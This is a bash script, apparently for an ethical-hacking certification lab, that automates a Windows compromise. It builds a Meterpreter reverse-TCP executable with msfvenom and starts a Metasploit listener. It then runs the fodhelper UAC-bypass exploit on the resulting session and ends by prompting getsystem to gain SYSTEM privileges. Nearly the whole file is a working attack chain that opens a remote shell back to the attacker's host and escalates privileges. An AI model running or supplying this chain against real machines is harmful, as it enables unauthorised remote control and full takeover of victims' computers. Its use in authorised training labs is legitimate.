#!/bin/bash

# ==============================================================================
# CEH Lab 2: UAC Bypass & Privilege Escalation Orchestrator
# ==============================================================================

# 1. Root Check with proper exit status
if [[ "$EUID" -ne 0 ]]; then
    echo "[ERROR] This script must be run as root (sudo su)." >&2
    exit 1
fi

# 2. Prerequisite Check
REQUIRED_CMDS=("msfvenom" "msfconsole" "realpath")
for cmd in "${REQUIRED_CMDS[@]}"; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "[ERROR] Required command '$cmd' is not installed. Aborting." >&2
        exit 1
    fi
done

echo "--- Lab 2 Configuration ---"

# 3. Input Validation
while true; do
    read -p "Enter Attacker IP (LHOST): " LHOST
    if [[ $LHOST =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        break
    else
        echo "[!] Invalid IPv4 format. Please try again."
    fi
done

while true; do
    read -p "Enter Attacker Port (LPORT): " LPORT
    if [[ $LPORT =~ ^[0-9]+$ ]] && [ "$LPORT" -ge 1 ] && [ "$LPORT" -le 65535 ]; then
        break
    else
        echo "[!] Invalid port number. Please enter a value between 1-65535."
    fi
done

# Define Paths
EXE_PATH="/home/attacker/Desktop/Windows.exe"
HANDLER_RC="handler.rc"
ESCALATE_RC="escalate.rc"

# 4. Payload Generation with strict validation
echo -e "\n[*] Generating Windows Payload..."
# Remove old file to ensure we aren't reporting a "false positive" existence
rm -f "$EXE_PATH"

if msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > "$EXE_PATH"; then
    # Verify the file is not empty
    if [ -s "$EXE_PATH" ]; then
        FULL_PATH=$(realpath "$EXE_PATH")
        echo "[+] SUCCESS: Payload generated."
        echo "[!] LOCATION: $FULL_PATH"
    else
        echo "[ERROR] Payload file was created but is empty." >&2
        exit 1
    fi
else
    echo "[ERROR] msfvenom failed to generate the payload." >&2
    exit 1
fi

# 5. Resource File Creation
echo "[*] Creating Metasploit resource files..."

# Handler RC: Starts the listener
cat <<EOF > "$HANDLER_RC"
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j
EOF

# Escalation RC: Performs the UAC Bypass
# Note: We use a variable for the session ID which the user will verify
cat <<EOF > "$ESCALATE_RC"
# This script assumes the session is already active
# Replace '1' with the actual session ID if different
set SESSION_ID 1 
use exploit/windows/local/bypassuac_fodhelper
set session \$SESSION_ID
set LHOST $LHOST
set TARGET 0
exploit
EOF

echo -e "\n===================================================================="
echo "STAGE 1: ESTABLISHING CONNECTION"
echo "1. Transfer the file to the target: $EXE_PATH"
echo "2. Launching Metasploit Listener now..."
echo "===================================================================="
sleep 2

# Launch Metasploit
msfconsole -r "$HANDLER_RC"

# The script will pause here while msfconsole is running.
# Once the user exits msfconsole or backgrounds it:

echo -e "\n\n===================================================================="
echo "STAGE 2: PRIVILEGE ESCALATION"
echo "Check your active sessions: 'sessions -l'"
read -p "Enter the Session ID to escalate (default 1): " SID
SID=${SID:-1}

# We create a temporary RC for the specific session ID chosen
cat <<EOF > "temp_esc.rc"
use exploit/windows/local/bypassuac_fodhelper
set session $SID
set LHOST $LHOST
set TARGET 0
exploit
EOF

echo "[*] Launching Escalation for Session $SID..."
msfconsole -r "temp_esc.rc"

echo -e "\n[!] FINAL STEP: Inside the new Meterpreter session, type:"
echo "    getsystem -t 1"
echo "    getuid"
echo "===================================================================="
